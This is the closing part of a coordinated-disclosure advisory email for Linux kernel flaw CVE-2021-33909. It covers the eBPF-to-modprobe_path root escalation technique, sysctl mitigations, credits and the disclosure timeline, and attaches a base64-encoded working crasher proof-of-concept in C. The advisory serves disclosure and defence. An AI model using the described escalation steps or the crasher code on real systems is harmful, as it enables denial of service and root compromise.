- BPF_ALU64_REG(BPF_ADD, BPF_REG_4, BPF_REG_7) adds BPF_REG_7 (our
  variable 16-bit offset) to BPF_REG_4, which therefore points safely
  within the bounds of our corrupt map (because BPF_REG_7 is in the
  [0,64KB] range).

However, our eBPF-program corruption overwrites the instruction
BPF_ALU64_IMM(BPF_ADD, BPF_REG_4, 3*64KB/2) with the string "deleted",
which translates into BPF_ALU32_IMM(BPF_LSH, BPF_REG_5, 0x74) (a NOP).
As a result, the following BPF_ALU64_IMM(BPF_SUB, BPF_REG_4, 3*64KB/4)
points BPF_REG_4 out of bounds and allows us to read from and write to
the struct bpf_map that precedes our corrupt map in kernel space.

Finally, we transform this limited out-of-bounds read and write into an
arbitrary read and write of kernel memory, by reusing Manfred Paul's btf
and map_push_elem techniques:

- With the arbitrary kernel read we locate the symbol "__request_module"
  and hence the function __request_module(), disassemble this function,
  and extract the address of modprobe_path[] from the instructions for
  "if (!modprobe_path[0])".

- With the arbitrary kernel write we overwrite the contents of
  modprobe_path[] ("/sbin/modprobe" by default) with a path to our own
  executable, and call request_module() (by creating a netlink socket),
  which executes modprobe_path, and hence our own executable, as root.


=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D
Mitigations
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D

Important note: the following mitigations prevent only our specific
exploit from working (but other exploitation techniques may exist); to
completely fix this vulnerability, the kernel must be patched.

- Set /proc/sys/kernel/unprivileged_userns_clone to 0, to prevent an
  attacker from mounting a long directory in a user namespace. However,
  the attacker may mount a long directory via FUSE instead; we have not
  fully explored this possibility, because we accidentally stumbled upon
  CVE-2021-33910 in systemd: if an attacker FUSE-mounts a long directory
  (longer than 8MB), then systemd exhausts its stack, crashes, and
  therefore crashes the entire operating system (a kernel panic).

- Set /proc/sys/kernel/unprivileged_bpf_disabled to 1, to prevent an
  attacker from loading an eBPF program into the kernel. However, the
  attacker may corrupt other vmalloc()ated objects instead (for example,
  thread stacks), but we have not investigated this possibility.


=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D
Acknowledgments
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D

We thank the PaX Team for answering our many questions about the Linux
kernel. We also thank Manfred Paul, Jann Horn, Brandon Azad, Simon
Scannell, and Bruce Leidl for their exploits and write-ups:

https://www.thezdi.com/blog/2020/4/8/cve-2020-8835-linux-kernel-privilege-e=
scalation-via-improper-ebpf-program-verification
https://googleprojectzero.blogspot.com/2016/06/exploiting-recursion-in-linu=
x-kernel_20.html
https://googleprojectzero.blogspot.com/2020/12/an-ios-hacker-tries-android.=
html
https://scannell.io/posts/ebpf-fuzzing/
https://github.com/brl/grlh

We thank Red Hat Product Security and the members of
linux-distros@openwall and security@kernel for their work on this
coordinated disclosure. We also thank Mitre's CVE Assignment Team.
Finally, we thank Marco Ivaldi for his continued support.


=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D
Timeline
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D

2021-06-09: We sent our advisories for CVE-2021-33909 and CVE-2021-33910
to Red Hat Product Security (the two vulnerabilities are closely related
and the systemd-security mailing list is hosted by Red Hat).

2021-07-06: We sent our advisories, and Red Hat sent the patches they
wrote, to the linux-distros@openwall mailing list.

2021-07-13: We sent our advisory for CVE-2021-33909, and Red Hat sent
the patch they wrote, to the security@kernel mailing list.

2021-07-20: Coordinated Release Date (12:00 PM UTC).


--_002_20210720123335GA19170localhostlocaldomain_
Content-Type: text/plain; name="CVE-2021-33909-crasher.c"
Content-Description: CVE-2021-33909-crasher.c
Content-Disposition: attachment; filename="CVE-2021-33909-crasher.c";
	size=6904; creation-date="Tue, 20 Jul 2021 12:36:11 GMT";
	modification-date="Tue, 20 Jul 2021 12:36:11 GMT"
Content-ID: <9B0F69A49452FE44930F8C18870F409E@namprd06.prod.outlook.com>
Content-Transfer-Encoding: base64

LyoNCiAqIENWRS0yMDIxLTMzOTA5OiBzaXplX3QtdG8taW50IHZ1bG5lcmFi
aWxpdHkgaW4gTGludXgncyBmaWxlc3lzdGVtIGxheWVyDQogKiBDb3B5cmln
aHQgKEMpIDIwMjEgUXVhbHlzLCBJbmMuDQogKg0KICogVGhpcyBwcm9ncmFt
IGlzIGZyZWUgc29mdHdhcmU6IHlvdSBjYW4gcmVkaXN0cmlidXRlIGl0IGFu
ZC9vciBtb2RpZnkNCiAqIGl0IHVuZGVyIHRoZSB0ZXJtcyBvZiB0aGUgR05V
IEdlbmVyYWwgUHVibGljIExpY2Vuc2UgYXMgcHVibGlzaGVkIGJ5DQogKiB0
aGUgRnJlZSBTb2Z0d2FyZSBGb3VuZGF0aW9uLCBlaXRoZXIgdmVyc2lvbiAz
IG9mIHRoZSBMaWNlbnNlLCBvcg0KICogKGF0IHlvdXIgb3B0aW9uKSBhbnkg
bGF0ZXIgdmVyc2lvbi4NCiAqDQogKiBUaGlzIHByb2dyYW0gaXMgZGlzdHJp
YnV0ZWQgaW4gdGhlIGhvcGUgdGhhdCBpdCB3aWxsIGJlIHVzZWZ1bCwNCiAq
IGJ1dCBXSVRIT1VUIEFOWSBXQVJSQU5UWTsgd2l0aG91dCBldmVuIHRoZSBp
bXBsaWVkIHdhcnJhbnR5IG9mDQogKiBNRVJDSEFOVEFCSUxJVFkgb3IgRklU
TkVTUyBGT1IgQSBQQVJUSUNVTEFSIFBVUlBPU0UuICBTZWUgdGhlDQogKiBH
TlUgR2VuZXJhbCBQdWJsaWMgTGljZW5zZSBmb3IgbW9yZSBkZXRhaWxzLg0K
ICoNCiAqIFlvdSBzaG91bGQgaGF2ZSByZWNlaXZlZCBhIGNvcHkgb2YgdGhl
IEdOVSBHZW5lcmFsIFB1YmxpYyBMaWNlbnNlDQogKiBhbG9uZyB3aXRoIHRo
aXMgcHJvZ3JhbS4gIElmIG5vdCwgc2VlIDxodHRwczovL3d3dy5nbnUub3Jn
L2xpY2Vuc2VzLz4uDQogKi8NCg0KI2RlZmluZSBfR05VX1NPVVJDRQ0KI2lu
Y2x1ZGUgPGVycm5vLmg+DQojaW5jbHVkZSA8ZmNudGwuaD4NCiNpbmNsdWRl
IDxsaW1pdHMuaD4NCiNpbmNsdWRlIDxzY2hlZC5oPg0KI2luY2x1ZGUgPHN0
ZGRlZi5oPg0KI2luY2x1ZGUgPHN0ZGludC5oPg0KI2luY2x1ZGUgPHN0ZGlv
Lmg+DQojaW5jbHVkZSA8c3RkbGliLmg+DQojaW5jbHVkZSA8c3RyaW5nLmg+
DQojaW5jbHVkZSA8c3lzL21tYW4uaD4NCiNpbmNsdWRlIDxzeXMvbW91bnQu
aD4NCiNpbmNsdWRlIDxzeXMvcGFyYW0uaD4NCiNpbmNsdWRlIDxzeXMvc29j
a2V0Lmg+DQojaW5jbHVkZSA8c3lzL3N0YXQuaD4NCiNpbmNsdWRlIDxzeXMv
dHlwZXMuaD4NCiNpbmNsdWRlIDxzeXMvdW4uaD4NCiNpbmNsdWRlIDxzeXMv
d2FpdC5oPg0KI2luY2x1ZGUgPHVuaXN0ZC5oPg0KDQojZGVmaW5lIFBBR0Vf
U0laRSAoNDA5NikNCg0KI2RlZmluZSBkaWUoKSBkbyB7IFwNCiAgICBmcHJp
bnRmKHN0ZGVyciwgImRpZWQgaW4gJXM6ICV1XG4iLCBfX2Z1bmNfXywgX19M
SU5FX18pOyBcDQogICAgZXhpdChFWElUX0ZBSUxVUkUpOyBcDQp9IHdoaWxl
ICgwKQ0KDQpzdGF0aWMgdm9pZA0Kc2VuZF9yZWN2X3N0YXRlKGNvbnN0IGlu
dCBzb2NrLCBjb25zdCBjaGFyICogY29uc3Qgc3N0YXRlLCBjb25zdCBjaGFy
IHJzdGF0ZSkNCnsNCiAgICBpZiAoc3N0YXRlKSB7DQogICAgICAgIGlmIChz
ZW5kKHNvY2ssIHNzdGF0ZSwgMSwgTVNHX05PU0lHTkFMKSAhPSAxKSBkaWUo
KTsNCiAgICB9DQogICAgaWYgKHJzdGF0ZSkgew0KICAgICAgICBjaGFyIHN0
YXRlID0gMDsNCiAgICAgICAgaWYgKHJlYWQoc29jaywgJnN0YXRlLCAxKSAh
PSAxKSBkaWUoKTsNCiAgICAgICAgaWYgKHN0YXRlICE9IHJzdGF0ZSkgZGll
KCk7DQogICAgfQ0KfQ0KDQpzdGF0aWMgY29uc3QgY2hhciAqIGJpZ2RpcjsN
CnN0YXRpYyBjaGFyIG9uZWRpcltOQU1FX01BWCArIDFdOw0KDQp0eXBlZGVm
IHN0cnVjdCB7DQogICAgcGlkX3QgcGlkOw0KICAgIGludCBzb2Nrc1syXTsN
CiAgICBzaXplX3QgY291bnQ7DQogICAgaW50IGRlbGV0ZTsNCn0gdF91c2Vy
bnM7DQoNCnN0YXRpYyBpbnQNCnVzZXJuc19mbih2b2lkICogY29uc3QgYXJn
KQ0Kew0KICAgIGlmICghYXJnKSBkaWUoKTsNCiAgICBjb25zdCB0X3VzZXJu
cyAqIGNvbnN0IHVzZXJucyA9IGFyZzsNCiAgICBjb25zdCBpbnQgc29jayA9
IHVzZXJucy0+c29ja3NbMV07DQogICAgaWYgKGNsb3NlKHVzZXJucy0+c29j
a3NbMF0pKSBkaWUoKTsNCg0KICAgIHNlbmRfcmVjdl9zdGF0ZShzb2NrLCBO
VUxMLCAnQScpOw0KDQogICAgc2l6ZV90IG47DQogICAgaWYgKGNoZGlyKGJp
Z2RpcikpIGRpZSgpOw0KICAgIGZvciAobiA9IDA7IG4gPD0gdXNlcm5zLT5j
b3VudCAvICgxICsgKHNpemVvZihvbmVkaXIpLTEpICogNCk7IG4rKykgew0K
ICAgICAgICBpZiAoY2hkaXIob25lZGlyKSkgZGllKCk7DQogICAgfQ0KICAg
IGNoYXIgZGV2aWNlW10gPSAiLi9kZXZpY2UuWFhYWFhYIjsNCiAgICBpZiAo
IW1rZHRlbXAoZGV2aWNlKSkgZGllKCk7DQogICAgY2hhciBtcG9pbnRbXSA9
ICIvdG1wL21wb2ludC5YWFhYWFgiOw0KICAgIGlmICghbWtkdGVtcChtcG9p
bnQpKSBkaWUoKTsNCiAgICBpZiAobW91bnQoZGV2aWNlLCBtcG9pbnQsIE5V
TEwsIE1TX0JJTkQsIE5VTEwpKSBkaWUoKTsNCg0KICAgIGlmICh1c2VybnMt
PmRlbGV0ZSkgew0KICAgICAgICBpZiAocm1kaXIoZGV2aWNlKSkgZGllKCk7
DQogICAgfQ0KICAgIGlmIChjaGRpcigiLyIpKSBkaWUoKTsNCg0KICAgIHNl
bmRfcmVjdl9zdGF0ZShzb2NrLCAiQiIsICdDJyk7DQoNCiAgICBjb25zdCBp
bnQgZmQgPSBvcGVuKCIvcHJvYy9zZWxmL21vdW50aW5mbyIsIE9fUkRPTkxZ
KTsNCiAgICBpZiAoZmQgPD0gLTEpIGRpZSgpOw0KICAgIHN0YXRpYyBjaGFy
IGJ1ZlsxVUwgPDwgMjBdOw0KICAgIHNpemVfdCBsZW4gPSAwOw0KICAgIGZv
ciAoOzspIHsNCiAgICAgICAgc3NpemVfdCBuYnIgPSByZWFkKGZkLCBidWYs
IDEwMjQpOw0KICAgICAgICBpZiAobmJyIDw9IDApIGRpZSgpOw0KICAgICAg
ICBmb3IgKDs7KSB7DQogICAgICAgICAgICBjb25zdCBjaGFyICogbmwgPSBt
ZW1jaHIoYnVmLCAnXG4nLCBuYnIpOw0KICAgICAgICAgICAgaWYgKCFubCkg
YnJlYWs7DQogICAgICAgICAgICBubCsrOw0KICAgICAgICAgICAgaWYgKG1l
bW1lbShidWYsIG5sIC0gYnVmLCAiXFwxMzQiLCA0KSkgZGllKCk7DQogICAg
ICAgICAgICBuYnIgLT0gbmwgLSBidWY7DQogICAgICAgICAgICBtZW1tb3Zl
KGJ1ZiwgbmwsIG5icik7DQogICAgICAgICAgICBsZW4gPSAwOw0KICAgICAg
ICB9DQogICAgICAgIGxlbiArPSBuYnI7DQogICAgICAgIGlmIChtZW1tZW0o
YnVmLCBuYnIsICJcXDEzNCIsIDQpKSBicmVhazsNCiAgICB9DQoNCiAgICBz
ZW5kX3JlY3Zfc3RhdGUoc29jaywgIkQiLCAnRScpOw0KICAgIGRpZSgpOw0K
fQ0KDQpzdGF0aWMgdm9pZA0KdXBkYXRlX2lkX21hcChjaGFyICogY29uc3Qg
bWFwcGluZywgY29uc3QgY2hhciAqIGNvbnN0IG1hcF9maWxlKQ0Kew0KICAg
IGNvbnN0IHNpemVfdCBtYXBfbGVuID0gc3RybGVuKG1hcHBpbmcpOw0KICAg
IGlmIChtYXBfbGVuID49IFNTSVpFX01BWCkgZGllKCk7DQogICAgaWYgKG1h
cF9sZW4gPD0gMCkgZGllKCk7DQoNCiAgICBzaXplX3QgaTsNCiAgICBmb3Ig
KGkgPSAwOyBpIDwgbWFwX2xlbjsgaSsrKSB7DQogICAgICAgIGlmIChtYXBw
aW5nW2ldID09ICcsJykNCiAgICAgICAgICAgIG1hcHBpbmdbaV0gPSAnXG4n
Ow0KICAgIH0NCg0KICAgIGNvbnN0IGludCBmZCA9IG9wZW4obWFwX2ZpbGUs
IE9fV1JPTkxZKTsNCiAgICBpZiAoZmQgPD0gLTEpIGRpZSgpOw0KICAgIGlm
ICh3cml0ZShmZCwgbWFwcGluZywgbWFwX2xlbikgIT0gKHNzaXplX3QpbWFw
X2xlbikgZGllKCk7DQogICAgaWYgKGNsb3NlKGZkKSkgZGllKCk7DQp9DQoN
CnN0YXRpYyB2b2lkDQpwcm9jX3NldGdyb3Vwc193cml0ZShjb25zdCBwaWRf
dCBjaGlsZF9waWQsIGNvbnN0IGNoYXIgKiBjb25zdCBzdHIpDQp7DQogICAg
Y29uc3Qgc2l6ZV90IHN0cl9sZW4gPSBzdHJsZW4oc3RyKTsNCiAgICBpZiAo
c3RyX2xlbiA+PSBTU0laRV9NQVgpIGRpZSgpOw0KICAgIGlmIChzdHJfbGVu
IDw9IDApIGRpZSgpOw0KDQogICAgY2hhciBzZXRncm91cHNfcGF0aFs2NF07
DQogICAgc25wcmludGYoc2V0Z3JvdXBzX3BhdGgsIHNpemVvZihzZXRncm91
cHNfcGF0aCksICIvcHJvYy8lbGQvc2V0Z3JvdXBzIiwgKGxvbmcpY2hpbGRf
cGlkKTsNCg0KICAgIGNvbnN0IGludCBmZCA9IG9wZW4oc2V0Z3JvdXBzX3Bh
dGgsIE9fV1JPTkxZKTsNCiAgICBpZiAoZmQgPD0gLTEpIHsNCiAgICAgICAg
aWYgKGZkICE9IC0xKSBkaWUoKTsNCiAgICAgICAgaWYgKGVycm5vICE9IEVO
T0VOVCkgZGllKCk7DQogICAgICAgIHJldHVybjsNCiAgICB9DQogICAgaWYg
KHdyaXRlKGZkLCBzdHIsIHN0cl9sZW4pICE9IChzc2l6ZV90KXN0cl9sZW4p
IGRpZSgpOw0KICAgIGlmIChjbG9zZShmZCkpIGRpZSgpOw0KfQ0KDQpzdGF0
aWMgdm9pZA0KZm9ya191c2VybnModF91c2VybnMgKiBjb25zdCB1c2VybnMs
IGNvbnN0IHNpemVfdCBzaXplLCBjb25zdCBpbnQgZGVsZXRlKQ0Kew0KICAg
IHN0YXRpYyBjb25zdCBzaXplX3Qgc3RhY2tfc2l6ZSA9ICgxVUwgPDwgMjAp
ICsgMiAqIFBBR0VfU0laRTsNCiAgICBzdGF0aWMgY2hhciAqIHN0YWNrID0g
TlVMTDsNCiAgICBpZiAoIXN0YWNrKSB7DQogICAgICAgIHN0YWNrID0gbW1h
cChOVUxMLCBzdGFja19zaXplLCBQUk9UX05PTkUsIE1BUF9QUklWQVRFIHwg
TUFQX0FOT05ZTU9VUyB8IE1BUF9TVEFDSywgLTEsIDApOw0KICAgICAgICBp
ZiAoIXN0YWNrIHx8IHN0YWNrID09IE1BUF9GQUlMRUQpIGRpZSgpOw0KICAg
ICAgICBpZiAobXByb3RlY3Qoc3RhY2sgKyBQQUdFX1NJWkUsIHN0YWNrX3Np
emUgLSAyICogUEFHRV9TSVpFLCBQUk9UX1JFQUQgfCBQUk9UX1dSSVRFKSkg
ZGllKCk7DQogICAgfQ0KDQogICAgaWYgKCF1c2VybnMpIGRpZSgpOw0KICAg
IHVzZXJucy0+Y291bnQgPSBzaXplIC8gMjsNCiAgICB1c2VybnMtPmRlbGV0
ZSA9IGRlbGV0ZTsNCg0KICAgIGlmIChzb2NrZXRwYWlyKEFGX1VOSVgsIFNP
Q0tfU1RSRUFNLCAwLCB1c2VybnMtPnNvY2tzKSkgZGllKCk7DQogICAgdXNl
cm5zLT5waWQgPSBjbG9uZSh1c2VybnNfZm4sIHN0YWNrICsgc3RhY2tfc2l6
ZSAtIFBBR0VfU0laRSwgQ0xPTkVfTkVXVVNFUiB8IENMT05FX05FV05TIHwg
U0lHQ0hMRCwgdXNlcm5zKTsNCiAgICBpZiAodXNlcm5zLT5waWQgPD0gLTEp
IGRpZSgpOw0KICAgIGlmIChjbG9zZSh1c2VybnMtPnNvY2tzWzFdKSkgZGll
KCk7DQogICAgdXNlcm5zLT5zb2Nrc1sxXSA9IC0xOw0KDQogICAgY2hhciBt
YXBfcGF0aFs2NF0sIG1hcF9idWZbNjRdOw0KICAgIHNucHJpbnRmKG1hcF9w
YXRoLCBzaXplb2YobWFwX3BhdGgpLCAiL3Byb2MvJWxkL3VpZF9tYXAiLCAo
bG9uZyl1c2VybnMtPnBpZCk7DQogICAgc25wcmludGYobWFwX2J1Ziwgc2l6
ZW9mKG1hcF9idWYpLCAiMCAlbGQgMSIsIChsb25nKWdldHVpZCgpKTsNCiAg
ICB1cGRhdGVfaWRfbWFwKG1hcF9idWYsIG1hcF9wYXRoKTsNCg0KICAgIHBy
b2Nfc2V0Z3JvdXBzX3dyaXRlKHVzZXJucy0+cGlkLCAiZGVueSIpOw0KICAg
IHNucHJpbnRmKG1hcF9wYXRoLCBzaXplb2YobWFwX3BhdGgpLCAiL3Byb2Mv
JWxkL2dpZF9tYXAiLCAobG9uZyl1c2VybnMtPnBpZCk7DQogICAgc25wcmlu
dGYobWFwX2J1Ziwgc2l6ZW9mKG1hcF9idWYpLCAiMCAlbGQgMSIsIChsb25n
KWdldGdpZCgpKTsNCiAgICB1cGRhdGVfaWRfbWFwKG1hcF9idWYsIG1hcF9w
YXRoKTsNCg0KICAgIHNlbmRfcmVjdl9zdGF0ZSgqdXNlcm5zLT5zb2Nrcywg
IkEiLCAnQicpOw0KfQ0KDQpzdGF0aWMgdm9pZA0Kd2FpdF91c2VybnModF91
c2VybnMgKiBjb25zdCB1c2VybnMpDQp7DQogICAgaWYgKCF1c2VybnMpIGRp
ZSgpOw0KICAgIGlmIChraWxsKHVzZXJucy0+cGlkLCBTSUdLSUxMKSkgZGll
KCk7DQoNCiAgICBpbnQgc3RhdHVzID0gMDsNCiAgICBpZiAod2FpdHBpZCh1
c2VybnMtPnBpZCwgJnN0YXR1cywgMCkgIT0gdXNlcm5zLT5waWQpIGRpZSgp
Ow0KICAgIHVzZXJucy0+cGlkID0gLTE7DQogICAgaWYgKCFXSUZTSUdOQUxF
RChzdGF0dXMpKSBkaWUoKTsNCiAgICBpZiAoV1RFUk1TSUcoc3RhdHVzKSAh
PSBTSUdLSUxMKSBkaWUoKTsNCg0KICAgIGlmIChjbG9zZSgqdXNlcm5zLT5z
b2NrcykpIGRpZSgpOw0KICAgICp1c2VybnMtPnNvY2tzID0gLTE7DQp9DQoN
CmludA0KbWFpbihjb25zdCBpbnQgYXJnYywgY29uc3QgY2hhciAqIGNvbnN0
IGFyZ3ZbXSkNCnsNCiAgICBpZiAoYXJnYyAhPSAyKSBkaWUoKTsNCiAgICBi
aWdkaXIgPSBhcmd2WzFdOw0KICAgIGlmICgqYmlnZGlyICE9ICcvJykgZGll
KCk7DQoNCiAgICBpZiAoc2l6ZW9mKG9uZWRpcikgIT0gMjU2KSBkaWUoKTsN
CiAgICBtZW1zZXQob25lZGlyLCAnXFwnLCBzaXplb2Yob25lZGlyKS0xKTsN
CiAgICBpZiAob25lZGlyW3NpemVvZihvbmVkaXIpLTFdICE9ICdcMCcpIGRp
ZSgpOw0KDQogICAgcHV0cygiY3JlYXRpbmcgZGlyZWN0b3JpZXMsIHBsZWFz
ZSB3YWl0Li4uIik7DQogICAgaWYgKG1rZGlyKGJpZ2RpciwgU19JUldYVSkg
JiYgZXJybm8gIT0gRUVYSVNUKSBkaWUoKTsNCiAgICBpZiAoY2hkaXIoYmln
ZGlyKSkgZGllKCk7DQogICAgc2l6ZV90IGk7DQogICAgZm9yIChpID0gMDsg
aSA8PSAoMVVMIDw8IDMwKSAvICgxICsgKHNpemVvZihvbmVkaXIpLTEpICog
NCk7IGkrKykgew0KICAgICAgICBpZiAobWtkaXIob25lZGlyLCBTX0lSV1hV
KSAmJiBlcnJubyAhPSBFRVhJU1QpIGRpZSgpOw0KICAgICAgICBpZiAoY2hk
aXIob25lZGlyKSkgZGllKCk7DQogICAgfQ0KICAgIGlmIChjaGRpcigiLyIp
KSBkaWUoKTsNCg0KICAgIHN0YXRpYyB0X3VzZXJucyB1c2VybnM7DQogICAg
Zm9ya191c2VybnMoJnVzZXJucywgKDFVTCA8PCAzMSksIDEpOw0KICAgIHB1
dHMoImNyYXNoaW5nLi4uIik7DQogICAgc2VuZF9yZWN2X3N0YXRlKCp1c2Vy
bnMuc29ja3MsICJDIiwgJ0QnKTsNCiAgICB3YWl0X3VzZXJucygmdXNlcm5z
KTsNCiAgICBkaWUoKTsNCn0NCg==

--_002_20210720123335GA19170localhostlocaldomain_--

